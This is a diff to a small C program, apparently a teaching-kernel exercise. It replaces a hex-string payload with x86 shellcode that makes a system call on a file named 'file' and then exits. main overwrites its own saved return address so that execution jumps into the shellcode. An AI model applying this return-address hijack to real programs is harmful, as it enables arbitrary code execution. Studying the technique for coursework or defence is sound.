@@ -1,34 +1,20 @@
 #include <syscall.h>
 
 char shellcode[] =
-    "8B4424048B54240850526A04CD30";
-
-void sewy() {
-    printf("h\n");
-    int *ret;
-    printf("h\n");
-    printf("0x%d\n",&ret);
-    printf("h\n");
-    printf("0x%X\n",&ret);
-    ret = (int*)&ret + 1;
-    printf("h\n");
-    printf("0x%X\n",&ret);
-    (*ret) = (int)shellcode;
-    printf("h\n");
-    printf("0x%X\n",&ret);
-}
-
+  "\x90\x90\x90\x90\x90\xe9\x0b\x00"
+  "\x00\x00\x6a\x05\xcd\x30\x31\xc0"
+  "\x50\x40\x50\xcd\x30\xe8\xf0\xff"
+  "\xff\xff""file";
 int main( void )
-{   
-    char *filename = "exploited";
-    int size = 4;
-    printf("Yazeed is the goat\n");
-    sewy();
-}
+{
+  int *ret; /* A local variable is stored on the stack. */
 
-// mov eax,[esp+4];
-// mov edx,[esp+8];
-// push eax;
-// push edx;
-// push 0x04;
-// int 0x30;
+  ret = (int *)&ret + 2;   
+                        
+                        
+                        
+  (*ret) = (int)shellcode; 
+                        
+                        
+  return 0;
+}
